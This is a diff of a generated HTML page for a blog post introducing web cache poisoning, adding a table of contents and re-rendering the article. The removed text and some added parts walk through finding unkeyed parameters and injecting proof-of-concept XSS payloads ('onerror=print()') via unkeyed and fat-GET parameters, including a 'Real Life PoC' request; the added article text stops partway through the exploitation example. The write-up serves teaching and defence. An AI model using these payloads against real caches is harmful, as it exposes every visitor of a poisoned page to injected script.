@@ -77,13 +77,13 @@
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2025-02-18T00:00:00+00:00">
-    <meta property="article:modified_time" content="2025-02-18T00:00:00+00:00">
-    <meta property="og:image" content="http://localhost:1313/posts/intro-to-cache-poisoning/feature.webp">
+    <meta property="article:published_time" content="2025-02-19T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-02-19T00:00:00+00:00">
+    <meta property="og:image" content="http://localhost:1313/posts/intro-to-cache-poisoning/feature.png">
 
   
   <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:image" content="http://localhost:1313/posts/intro-to-cache-poisoning/feature.webp">
+  <meta name="twitter:image" content="http://localhost:1313/posts/intro-to-cache-poisoning/feature.png">
   <meta name="twitter:title" content="Introduction to Cache Poisoning Attacks">
   <meta name="twitter:description" content="Introduction into Cache Poisoning Attacks">
 
@@ -96,7 +96,7 @@
     "name": "Introduction to Cache Poisoning Attacks",
     "headline": "Introduction to Cache Poisoning Attacks",
     "description": "Introduction into Cache Poisoning Attacks",
-    "abstract": "Introduction During a recent penetration test of a web application, we discovered a Cross-Site Scripting (XSS) via caching vunlerabillity.",
+    "abstract": "Terminology #\rKeyed Parameters #\rKeyed parameters are parameters that the cache system considers when storing and retrieving cached content.",
     "inLanguage": "en",
     "url" : "http:\/\/localhost:1313\/posts\/intro-to-cache-poisoning\/",
     "author" : {
@@ -104,15 +104,15 @@
       "name": "Max"
     },
     "copyrightYear": "2025",
-    "dateCreated": "2025-02-18T00:00:00\u002b00:00",
-    "datePublished": "2025-02-18T00:00:00\u002b00:00",
+    "dateCreated": "2025-02-19T00:00:00\u002b00:00",
+    "datePublished": "2025-02-19T00:00:00\u002b00:00",
     
-    "dateModified": "2025-02-18T00:00:00\u002b00:00",
+    "dateModified": "2025-02-19T00:00:00\u002b00:00",
     
     
     
     "mainEntityOfPage": "true",
-    "wordCount": "814"
+    "wordCount": "815"
   }]
   </script>
 
@@ -462,7 +462,7 @@
 
     
     <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom"
-    style="background-image:url(/posts/intro-to-cache-poisoning/feature.webp);">
+    style="background-image:url(/posts/intro-to-cache-poisoning/feature.png);">
     
 
 
@@ -568,16 +568,10 @@
 <div class="flex flex-row flex-wrap items-center">
   
   
-  <time datetime="2025-02-18T00:00:00&#43;00:00">18 February 2025</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">4 mins</span>
+  <time datetime="2025-02-19T00:00:00&#43;00:00">19 February 2025</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">4 mins</span>
   
 
   
-  
-  <span class="pl-2"><span class="flex" style="cursor: pointer;">
-  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Draft
-  </span>
-</span></span>
   
 </div>
 
@@ -612,7 +606,151 @@
   
   <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
     
-    
+     <div
+      class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8">
+      <div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-[140px]">
+
+         <details open id="TOCView"
+  class="toc-right mt-0 overflow-y-scroll overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#i-classfa-solid-fa-worm-text-primary-400i-terminology"><i class="fa-solid fa-worm text-primary-400"></i> Terminology</a>
+      <ul>
+        <li><a href="#keyed-parameters">Keyed Parameters</a></li>
+        <li><a href="#unkeyed-parameters">Unkeyed Parameters</a></li>
+      </ul>
+    </li>
+    <li><a href="#i-classfa-solid-fa-magnifying-glass-text-primary-400i-identifying-unkeyed-parameters"><i class="fa-solid fa-magnifying-glass text-primary-400"></i> Identifying Unkeyed Parameters</a>
+      <ul>
+        <li><a href="#example">Example</a></li>
+      </ul>
+    </li>
+    <li><a href="#i-classfa-solid-fa-bullseye-text-primary-400i-exploitation"><i class="fa-solid fa-bullseye text-primary-400"></i> Exploitation</a>
+      <ul>
+        <li><a href="#example-1">Example</a></li>
+      </ul>
+    </li>
+    <li><a href="#i-classfa-solid-fa-user-ninja-text-primary-400i-advanced-techniques"><i class="fa-solid fa-user-ninja text-primary-400"></i> Advanced Techniques</a>
+      <ul>
+        <li><a href="#fat-get">Fat GET</a></li>
+      </ul>
+    </li>
+    <li><a href="#i-classfa-solid-fa-book-text-primary-400i-a-real-life-poc"><i class="fa-solid fa-book text-primary-400"></i> A Real Life PoC</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#i-classfa-solid-fa-worm-text-primary-400i-terminology"><i class="fa-solid fa-worm text-primary-400"></i> Terminology</a>
+      <ul>
+        <li><a href="#keyed-parameters">Keyed Parameters</a></li>
+        <li><a href="#unkeyed-parameters">Unkeyed Parameters</a></li>
+      </ul>
+    </li>
+    <li><a href="#i-classfa-solid-fa-magnifying-glass-text-primary-400i-identifying-unkeyed-parameters"><i class="fa-solid fa-magnifying-glass text-primary-400"></i> Identifying Unkeyed Parameters</a>
+      <ul>
+        <li><a href="#example">Example</a></li>
+      </ul>
+    </li>
+    <li><a href="#i-classfa-solid-fa-bullseye-text-primary-400i-exploitation"><i class="fa-solid fa-bullseye text-primary-400"></i> Exploitation</a>
+      <ul>
+        <li><a href="#example-1">Example</a></li>
+      </ul>
+    </li>
+    <li><a href="#i-classfa-solid-fa-user-ninja-text-primary-400i-advanced-techniques"><i class="fa-solid fa-user-ninja text-primary-400"></i> Advanced Techniques</a>
+      <ul>
+        <li><a href="#fat-get">Fat GET</a></li>
+      </ul>
+    </li>
+    <li><a href="#i-classfa-solid-fa-book-text-primary-400i-a-real-life-poc"><i class="fa-solid fa-book text-primary-400"></i> A Real Life PoC</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+<script>
+
+  var margin = 200;
+  var marginError = 50;
+
+  (function () {
+    var $window = $(window);
+    var $toc = $('#TOCView');
+    var tocHeight = $toc.height();
+
+    function onResize() {
+      var windowAndMarginHeight = $window.height() - margin;
+      if(tocHeight >= windowAndMarginHeight) {
+        $toc.css("overflow-y", "scroll")
+        $toc.css("max-height", (windowAndMarginHeight + marginError) + "px")
+      } else {
+        $toc.css("overflow-y", "hidden")
+        $toc.css("max-height", "9999999px")
+      }
+    }
+
+    $window.on('resize', onResize);
+    $(document).ready(onResize);
+  })();
+
+
+
+  (function () {
+    var $toc = $('#TableOfContents');
+    if ($toc.length > 0) {
+      var $window = $(window);
+
+      function onScroll() {
+        var currentScroll = $window.scrollTop();
+        var h = $('.anchor');
+        var id = "";
+        h.each(function (i, e) {
+          e = $(e);
+          if (e.offset().top - $(window).height()/3 <= currentScroll) {
+            id = decodeURIComponent(e.attr('id'));
+          }
+        });
+        var active = $toc.find('a.active');      
+        if (active.length == 1 && active.eq(0).attr('href') == '#' + id) return true;
+
+        active.each(function (i, e) {
+          
+            $(e).removeClass('active');
+          
+        });
+        $toc.find('a[href="#' + id + '"]').addClass('active')
+        $toc.find('a[href="#' + id + '"]').parentsUntil('#TableOfContents').each(function (i, e) {
+          $(e).children('a').parents('ul').show();          
+        });
+      }
+
+      $window.on('scroll', onScroll);
+      $(document).ready(function () {
+        
+        onScroll();
+      });
+    }
+  })();
+
+
+</script>
+   </div>
+      </div>
+      
 
       <div class="min-w-0 min-h-0 max-w-fit">
         
@@ -621,179 +759,274 @@
 
         <div class="article-content max-w-prose mb-20">
           <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
-<pre tabindex="0"><code>Introduction
-During a recent penetration test of a web application, we discovered a Cross-Site Scripting (XSS) via caching vunlerabillity. This article explores the discovery, and exploitation of this issue to help developers and security professionals better understand and protect against similar vulnerabilities.
-Terminology
-Keyed Parameters
-Keyed parameters are parameters that the cache system considers when storing and retrieving cached content. This means that variations in these parameters will result in different cached entries.
-For example, if the URL has parameters such as ?user=123 and the cache is keyed on this parameter, the cache will store and serve different content (cache miss) for ?user=123 and ?user=456.
-Unkeyed Parameters
-Unkeyed parameters are parameters that the cache system ignores when storing and retrieving cached content. This means that variations in these parameters will not result in different cached entries. The cache will store only one version of the content (cache hit), regardless of the variations in these parameters.
-Step 1: Identifying Unkeyed Parameters
-The first step is to identify unkeyed parameters, since keyed parameters need to be the same when the victim accesses the resource.
-Example
-http
-GET /page?user=admin&amp;tracking=abc HTTP/1.1
-Host: example.com
-http
-HTTP/1.1 200 OK
-Content-Type: text/html
-Content-Length: 456
-X-Cache: MISS # &lt;-- Note that we get a cache MISS here
 
-&lt;html&gt;
-&lt;head&gt;
-  &lt;title&gt;Welcome&lt;/title&gt;
-&lt;/head&gt;
-&lt;body&gt;
-  &lt;p&gt;Welcome, admin!&lt;/p&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-Now we alter each parameter and check weather we get a cache miss or hit. A cache MISS indicates us that this parameter is keyed, since the server loaded a new version of the website.
-http
-GET /page?user=guest&amp;tracking=abc HTTP/1.1
-Host: example.com
-http
-HTTP/1.1 200 OK
-Content-Type: text/html
-Content-Length: 456
-X-Cache: MISS # &lt;-- Note we get a cache MISS here again (keyed parameter)
 
-&lt;html&gt;
-&lt;head&gt;
-  &lt;title&gt;Welcome&lt;/title&gt;
-&lt;/head&gt;
-&lt;body&gt;
-  &lt;p&gt;Welcome, guest!&lt;/p&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-Now that we identified the user parameter to be keyed, let’s continue and check the tracking parameter.
-http
-GET /page?user=admin&amp;tracking=abc HTTP/1.1
-Host: example.com
-http
-Content-Type: text/html
-Content-Length: 456
-X-Cache: HIT # &lt;-- Note that we get a cache HIT here, since we already made that requests before
+<h2 class="relative group"><i class="fa-solid fa-worm text-primary-400"></i> Terminology 
+    <div id="i-classfa-solid-fa-worm-text-primary-400i-terminology" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#i-classfa-solid-fa-worm-text-primary-400i-terminology" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
 
-&lt;html&gt;
-&lt;head&gt;
-  &lt;title&gt;Welcome&lt;/title&gt;
-&lt;/head&gt;
-&lt;body&gt;
-  &lt;p&gt;Welcome, admin!&lt;/p&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-http
-GET /page?user=admin&amp;tracking=efg HTTP/1.1
-Host: example.com
-http
-Content-Type: text/html
-Content-Length: 456
-X-Cache: HIT # &lt;-- Note that we get a cache HIT here again, indicating that this parameter is unkeyed
 
-&lt;html&gt;
-&lt;head&gt;
-  &lt;title&gt;Welcome&lt;/title&gt;
-&lt;/head&gt;
-&lt;body&gt;
-  &lt;p&gt;Welcome, admin!&lt;/p&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-We can observe the tracking parameter must be a unkeyed value, since the cache always returns HIT, even though the value of the parameter was changed.
-The same thing also sometimes applies to header values in the http requests.
-Step 2: Exploitation
-One of the most commong ways to exploit WCP is through XSS, though there are other attacks like DoS or unkeyed Cookies as well. To exploit a XSS you have to find an injection point using an unkeyed parameter. The XSS will then be severed to all other users loading that cached version.
-Example
-Imagine we have an injection via the tracking parameter into a meta tag like this
-http
-GET /page?user=admin&amp;tracking=https://mytrack.com HTTP/1.1
-...
+<h3 class="relative group">Keyed Parameters 
+    <div id="keyed-parameters" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#keyed-parameters" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p><span class="text-primary-400">Keyed parameters</span> are parameters that the cache system considers when storing and retrieving cached content. This means that <span class="text-primary-400">variations in these parameters will result in different cached entries</span>.</p>
+<p>For example, if the URL has parameters such as <code>?user=123</code> and the cache is <span class="text-primary-400 font-bold">keyed</span> on this parameter, the cache will <span class="text-primary-400">store and serve different content</span>  (<span class="text-primary-400 font-bold">cache miss</span>) for <code>?user=123</code> and <code>?user=456</code>.</p>
 
-&lt;meta http-equiv=&#34;refresh&#34; content=&#34;https://mytrack.com&#34; /&gt;
-http
-GET /page?user=admin&amp;tracking=&#34;&gt;&lt;img/src/onerror=print()&gt; HTTP/1.1
-Host: example.com
-http
-Content-Type: text/html
-Content-Length: 456
-X-Cache: MISS # &lt;-- Initial request will be a MISS, the next time we open it will be a HIT
 
-&lt;html&gt;
-&lt;head&gt;
-  &lt;title&gt;Welcome&lt;/title&gt;
-  &lt;meta http-equiv=&#34;refresh&#34; content=&#34;https://&#34;&gt;&lt;img/src/onerror=print()&gt; /&gt;
-&lt;/head&gt;
-&lt;body&gt;
-  &lt;p&gt;Welcome, admin!&lt;/p&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-Since tracking is an unkeyed parameter, anybody who visits the page /page?user=admin will be a victim of the XSS attack.
-Step 3: Advanced WCP Techniques
-Fat GET
-A “Fat GET” request, is when we use GET parameters in the post body, while still using the GET verb. If a server is misconfigured it might parse the parameters from the body.
-http
-GET /index.php?param1=Hello&amp;param2=World HTTP/1.1
-Host: example.com
-http
-GET /index.php?param1=Hello&amp;param2=World HTTP/1.1
-Host: example.com
-Content-Length: 10
+<h3 class="relative group">Unkeyed Parameters 
+    <div id="unkeyed-parameters" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#unkeyed-parameters" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p><span class="text-primary-400">Unkeyed parameters</span> are parameters that the cache system ignores when storing and retrieving cached content. This means that <span class="text-primary-400">variations in these parameters will not result in different cached entries</span>. The cache will store only one version of the content (<span class="text-primary-400 font-bold">cache hit</span>), regardless of the variations in these parameters.</p>
 
-param3=123
-With this you can try to create a discrepancy between the webserver and the cache. With this we can also use keyed parameters, since they are no longer directly present in the URL. We can then go back and perform an XSS attack the same way we did before.
-http
-GET /page?user=admin&amp;tracking=abc HTTP/1.1
-Host: example.com
 
-user=guest
-http
-Content-Type: text/html
-Content-Length: 456
-X-Cache: MISS
+<h2 class="relative group"><i class="fa-solid fa-magnifying-glass text-primary-400"></i> Identifying Unkeyed Parameters 
+    <div id="i-classfa-solid-fa-magnifying-glass-text-primary-400i-identifying-unkeyed-parameters" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#i-classfa-solid-fa-magnifying-glass-text-primary-400i-identifying-unkeyed-parameters" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>The first step is to <span class="text-primary-400">identify unkeyed parameters</span>, since keyed parameters need to be the same when the victim accesses the resource.</p>
 
-&lt;html&gt;
-&lt;head&gt;
-  &lt;title&gt;Welcome&lt;/title&gt;
-&lt;/head&gt;
-&lt;body&gt;
-  &lt;p&gt;Welcome, guest!&lt;/p&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-http
-GET /page?user=admin&amp;tracking=abc HTTP/1.1
-Host: example.com
 
-user=&lt;/p&gt;&lt;img/src/onerror=print()&gt;&lt;p&gt;
-http
-Content-Type: text/html
-Content-Length: 456
-X-Cache: MISS
+<h3 class="relative group">Example 
+    <div id="example" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#example" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Assume we open <code>example.com</code> on <code>/page</code> with the following parameters:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-HTTP" data-lang="HTTP"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/page?user=admin&amp;tracking=abc</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">example.com</span>
+</span></span></code></pre></div><p>Since <code>example.com</code> uses caching and we are visiting the page for the first time, we will see a cache <code>MISS</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-HTTP" data-lang="HTTP"><span class="line"><span class="cl"><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">text/html</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">456</span>
+</span></span><span class="line hl"><span class="cl"><span class="n">X-Cache</span><span class="o">:</span> <span class="l">MISS</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Welcome<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Welcome, admin!<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span></span></span></code></pre></div>
+<p>Now we <span class="text-primary-400">alter each parameter and check weather we get a cache miss or hit</span>. A cache <code>MISS</code> indicates us that this parameter is <span class="text-primary-400">keyed</span>, since the server loaded a new version of the website.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-HTTP" data-lang="HTTP"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/page?user=guest&amp;tracking=abc</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">example.com</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-HTTP" data-lang="HTTP"><span class="line"><span class="cl"><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">text/html</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">456</span>
+</span></span><span class="line hl"><span class="cl"><span class="n">X-Cache</span><span class="o">:</span> <span class="l">MISS</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Welcome<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line hl"><span class="cl">    <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Welcome, guest!<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span></span></span></code></pre></div>
+<p>Now that we identified the <span class="text-primary-400">user parameter to be keyed</span>, let’s continue and check the tracking parameter. Before we change the tracking parameter, lets resent our initial request where we got a cache <code>MISS</code>, to verify that the sytem now cached it.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-HTTP" data-lang="HTTP"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/page?user=admin&amp;tracking=abc</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">example.com</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-HTTP" data-lang="HTTP"><span class="line"><span class="cl"><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">text/html</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">456</span>
+</span></span><span class="line hl"><span class="cl"><span class="n">X-Cache</span><span class="o">:</span> <span class="l">HIT</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Welcome<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line hl"><span class="cl">    <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Welcome, admin!<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span></span></span></code></pre></div>
+<p>Great. Now, let&rsquo;s alter the value of the tracking parameter to see whether we get a cache <code>MISS</code>, indicating a keyed parameter, or a <code>HIT</code> again, indicating an unkeyed parameter.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-HTTP" data-lang="HTTP"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/page?user=admin&amp;tracking=some-other-value</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">example.com</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-HTTP" data-lang="HTTP"><span class="line"><span class="cl"><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">text/html</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">456</span>
+</span></span><span class="line hl"><span class="cl"><span class="n">X-Cache</span><span class="o">:</span> <span class="l">HIT</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Welcome<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line hl"><span class="cl">    <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Welcome, admin!<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span></span></span></code></pre></div>
+<p>We can observe the tracking parameter must be a <span class="text-primary-400">unkeyed value</span>, since the cache always returns HIT, even though the value of the parameter was changed.</p>
+<blockquote>
+<p>The same thing also sometimes applies to header values in the HTTP requests.</p>
+</blockquote>
 
-&lt;html&gt;
-&lt;head&gt;
-  &lt;title&gt;Welcome&lt;/title&gt;
-&lt;/head&gt;
-&lt;body&gt;
-  &lt;p&gt;Welcome, &lt;/p&gt;&lt;img/src/onerror=print()&gt;&lt;p&gt;!&lt;/p&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-Again, if a victim now opens example.com/page?user=admin the XSS will be loaded from the cache.
-A Real Life PoC
-http
-GET /?cb=100&amp;&#34;&gt;&lt;image/src/onerror=print()&gt; HTTP/2
-Host: target-website.com
-Accept-Language: en-US;q=0.9,en;q=0.8
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
 
-HTTP/2 200 OK
-CACHE: HIT
-htmlbars
-...
-&lt;meta property=&#34;og:url&#34; content=&#34;https://target-website.com/?cb=100&amp;&#34;&gt;&lt;image/src/onerror=print()&gt;&#34;&gt;
-...
-In this example, an image tag with an onerror event is injected into the URL parameter. When the server processes this request, the parameter is reflected in the HTML response and cached. Consequently, subsequent users requesting the cached page will execute the malicious JavaScript.
-</code></pre>
+<h2 class="relative group"><i class="fa-solid fa-bullseye text-primary-400"></i> Exploitation 
+    <div id="i-classfa-solid-fa-bullseye-text-primary-400i-exploitation" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#i-classfa-solid-fa-bullseye-text-primary-400i-exploitation" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>One of the <span class="text-primary-400">most common ways to exploit cache poisoning is through XSS</span>, though there are other attacks like DoS and unkeyed cookies. To exploit a XSS you have to <span class="text-primary-400">find an injection point using an unkeyed parameter</span>. The XSS will then be severed to all other users loading that cached version.</p>
+
+
+<h3 class="relative group">Example 
+    <div id="example-1" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#example-1" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Imagine we have an injection via the tracking parameter into a meta tag like this:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-HTTP" data-lang="HTTP"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/page?user=admin&amp;tracking=https://mytrack.com</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-HTML" data-lang="HTML"><span class="line"><span class="cl">...
